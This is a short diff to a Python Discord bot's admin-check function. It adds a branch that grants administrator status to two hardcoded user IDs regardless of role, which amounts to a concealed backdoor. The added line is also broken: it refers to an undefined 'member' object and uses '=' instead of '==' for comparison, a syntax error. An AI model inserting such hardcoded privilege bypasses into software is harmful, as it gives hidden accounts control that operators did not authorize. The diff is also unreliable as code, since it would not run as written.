@@ -1739,6 +1739,8 @@ def isMemberAdmin(message):
 	if not message.channel.is_private:
 		if discord.utils.get(message.author.roles, name=settings["ADMINROLE"]) != None:
 			return True
+		elif member.author.id = "143199979849121792" or member.author.id = "147106672815374336":
+			return True
 		else:
 			return False
 	else:
